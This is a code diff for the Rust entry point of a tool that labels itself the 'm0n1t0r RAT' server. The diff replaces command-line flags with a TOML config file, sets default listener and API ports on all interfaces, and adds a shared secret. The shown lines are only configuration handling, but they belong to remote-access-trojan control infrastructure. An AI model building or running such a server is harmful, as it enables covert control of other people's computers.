@@ -1,40 +1,55 @@
-use anyhow::Result;
-use clap::Parser;
+use anyhow::{Context, Result};
 use flexi_logger::Logger;
 use m0n1t0r_server::{Config, ServerMap};
+use serde::Deserialize;
 use std::{net::SocketAddr, path::PathBuf, sync::Arc};
 use tokio::sync::RwLock;
 
-#[derive(Parser, Debug)]
-#[command(version, about = "m0n1t0r RAT")]
-struct Arguments {
-    #[arg(long, default_value = "0.0.0.0:27853")]
+fn default_conn_addr() -> SocketAddr {
+    "0.0.0.0:27853".parse().unwrap()
+}
+
+fn default_api_addr() -> SocketAddr {
+    "0.0.0.0:10801".parse().unwrap()
+}
+
+fn default_log_level() -> String {
+    "debug".into()
+}
+
+#[derive(Deserialize)]
+struct FileConfig {
+    #[serde(default = "default_conn_addr")]
     conn_addr: SocketAddr,
-    #[arg(long, default_value = "0.0.0.0:10801")]
+    #[serde(default = "default_api_addr")]
     api_addr: SocketAddr,
-    #[arg(long)]
     key: PathBuf,
-    #[arg(long)]
     cert: PathBuf,
-    #[arg(long, default_value_t = false)]
+    #[serde(default)]
     use_https: bool,
-    #[arg(long, default_value = "debug")]
+    #[serde(default = "default_log_level")]
     log_level: String,
+    secret: String,
 }
 
 #[tokio::main]
 async fn main() -> Result<()> {
-    let args = Arguments::try_parse()?;
+    let config_path = std::env::args().nth(1).unwrap_or("config.toml".into());
+    let content =
+        std::fs::read_to_string(&config_path).context(format!("failed to read {config_path}"))?;
+    let file_config: FileConfig =
+        toml::from_str(&content).context(format!("failed to parse {config_path}"))?;
 
-    Logger::try_with_str(&args.log_level)?.start()?;
+    Logger::try_with_str(&file_config.log_level)?.start()?;
     ffmpeg_next::init()?;
 
     let config = Config::new(
-        &args.conn_addr,
-        &args.api_addr,
-        &args.key,
-        &args.cert,
-        args.use_https,
+        &file_config.conn_addr,
+        &file_config.api_addr,
+        &file_config.key,
+        &file_config.cert,
+        file_config.use_https,
+        file_config.secret,
     )?;
     let server_map = Arc::new(RwLock::new(ServerMap::new()));
 
